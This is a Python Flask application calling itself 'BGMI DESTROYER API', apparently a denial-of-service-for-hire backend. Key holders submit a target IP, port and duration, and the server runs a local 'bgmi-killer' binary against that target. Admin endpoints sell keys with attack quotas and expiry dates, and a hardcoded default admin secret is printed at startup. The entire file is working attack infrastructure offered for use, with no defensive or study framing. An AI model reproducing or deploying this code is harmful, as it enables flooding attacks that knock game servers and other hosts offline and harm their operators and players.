from flask import Flask, request, jsonify
import time
import secrets
import subprocess
import os
import sys
from datetime import datetime, timedelta

app = Flask(__name__)

# ================= CONFIGURATION =================
PORT = int(os.environ.get("PORT", 8080))
ADMIN_KEY = os.environ.get("ADMIN_KEY", "neoxdestroyer09@a")
RATE_LIMIT_SECONDS = 6

# ================= BINARY PATH =================
BINARY_PATH = os.path.join(os.path.dirname(__file__), "bgmi-killer")

# Make sure binary is executable
if os.path.exists(BINARY_PATH):
    os.chmod(BINARY_PATH, 0o755)
    print(f"✅ Binary found at: {BINARY_PATH}")
else:
    print(f"⚠️ Binary not found at: {BINARY_PATH}")

# ================= IN-MEMORY STORAGE (No MongoDB needed) =================
api_keys_store = {}
rate_limit_store = {}

def generate_api_key():
    return secrets.token_urlsafe(32)

def is_key_valid(key):
    if key not in api_keys_store:
        return False, "Invalid API key"
    expiry = api_keys_store[key].get("expiry")
    if expiry and expiry < datetime.now():
        return False, "API key expired"
    return True, "Valid"

def check_rate_limit(key):
    now = time.time()
    last = rate_limit_store.get(key, 0)
    if now - last < RATE_LIMIT_SECONDS:
        return False, RATE_LIMIT_SECONDS - (now - last)
    rate_limit_store[key] = now
    return True, 0

def decrement_remaining_attacks(key):
    if key not in api_keys_store:
        return False, "Key not found"
    remaining = api_keys_store[key].get("remaining_attacks")
    if remaining is None:
        return True, None
    if remaining <= 0:
        del api_keys_store[key]
        return False, "API key reached attack limit"
    api_keys_store[key]["remaining_attacks"] -= 1
    return True, remaining - 1

def execute_binary(target_ip, target_port, duration):
    try:
        if not os.path.exists(BINARY_PATH):
            return False, f"Binary not found at {BINARY_PATH}"
        
        cmd = [BINARY_PATH, target_ip, str(target_port), str(duration), "bgmi"]
        
        print(f"🚀 Executing: {' '.join(cmd)}")
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=duration + 10
        )
        
        if result.returncode == 0:
            return True, result.stdout if result.stdout else "Attack completed"
        else:
            return False, result.stderr if result.stderr else "Binary execution failed"
            
    except subprocess.TimeoutExpired:
        return False, f"Attack timed out"
    except Exception as e:
        return False, str(e)

# ================= FLASK ENDPOINTS =================

@app.route('/')
def root():
    return jsonify({
        "name": "BGMI DESTROYER API",
        "version": "4.0",
        "status": "running",
        "binary_available": os.path.exists(BINARY_PATH),
        "endpoints": {
            "attack": "/api/v1/attack",
            "generate": "/api/generate",
            "status": "/api/status"
        }
    })

@app.route('/api/health')
def health():
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "binary_available": os.path.exists(BINARY_PATH)
    })

@app.route('/api/v1/attack', methods=['POST'])
def attack():
    try:
        data = request.json or {}
        api_key = data.get('key') or request.headers.get('x-api-key')
        ip = data.get('ip')
        port = data.get('port')
        duration = data.get('duration')

        if not api_key:
            return jsonify({"success": False, "message": "Missing API key"}), 401
        if not all([ip, port, duration]):
            return jsonify({"success": False, "message": "Missing: ip, port, duration"}), 400

        try:
            port = int(port)
            duration = int(duration)
        except ValueError:
            return jsonify({"success": False, "message": "Port and duration must be numbers"}), 400
            
        if duration < 1 or duration > 180:
            return jsonify({"success": False, "message": "Duration must be 1-180 seconds"}), 400

        valid, msg = is_key_valid(api_key)
        if not valid:
            return jsonify({"success": False, "message": msg}), 401

        can_attack, wait = check_rate_limit(api_key)
        if not can_attack:
            return jsonify({"success": False, "message": f"Cooldown! Wait {int(wait)} seconds"}), 429

        success, remaining = decrement_remaining_attacks(api_key)
        if not success:
            return jsonify({"success": False, "message": remaining}), 403

        attack_success, output = execute_binary(ip, port, duration)

        if attack_success:
            return jsonify({
                "success": True,
                "message": "Attack launched successfully",
                "target": f"{ip}:{port}",
                "duration": f"{duration}s",
                "remaining_attacks": remaining if remaining is not None else "Unlimited",
                "attack_id": int(time.time())
            }), 200
        else:
            return jsonify({
                "success": False,
                "message": f"Attack failed: {output}"
            }), 500

    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

@app.route('/api/generate', methods=['POST'])
def generate_key():
    if request.headers.get('X-Admin-Key') != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    data = request.json or {}
    days = data.get('days', 30)
    max_attacks = data.get('max_attacks')

    new_key = generate_api_key()
    expiry = datetime.now() + timedelta(days=days)

    api_keys_store[new_key] = {
        "expiry": expiry,
        "remaining_attacks": max_attacks,
        "created_at": datetime.now()
    }

    return jsonify({
        "success": True,
        "api_key": new_key,
        "expires_in": f"{days} days",
        "max_attacks": max_attacks or "Unlimited"
    }), 201

@app.route('/api/status', methods=['GET'])
def check_status():
    api_key = request.args.get('key')
    if not api_key:
        return jsonify({"error": "Missing key parameter"}), 400

    if api_key not in api_keys_store:
        return jsonify({"error": "Invalid API key"}), 404

    doc = api_keys_store[api_key]
    remaining = doc.get('remaining_attacks', 'Unlimited')
    
    return jsonify({
        "valid": doc['expiry'] > datetime.now(),
        "expires_in": max(0, int((doc['expiry'] - datetime.now()).total_seconds())),
        "remaining_attacks": remaining
    }), 200

@app.route('/api/revoke', methods=['POST'])
def revoke_key():
    if request.headers.get('X-Admin-Key') != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    api_key = request.json.get('api_key')
    if not api_key:
        return jsonify({"error": "Missing api_key"}), 400

    if api_key in api_keys_store:
        del api_keys_store[api_key]
        return jsonify({"success": True, "message": "API key revoked"}), 200
    return jsonify({"error": "API key not found"}), 404

# ================= MAIN =================
if __name__ == '__main__':
    print("\n" + "="*60)
    print("🔥 BGMI DESTROYER API - Railway Ready")
    print("="*60)
    print(f"📍 Port: {PORT}")
    print(f"🔑 Admin Key: {ADMIN_KEY}")
    print(f"⏱️  Rate Limit: {RATE_LIMIT_SECONDS}s")
    print(f"📁 Binary Path: {BINARY_PATH}")
    print(f"✅ Binary Available: {os.path.exists(BINARY_PATH)}")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=PORT, debug=False)
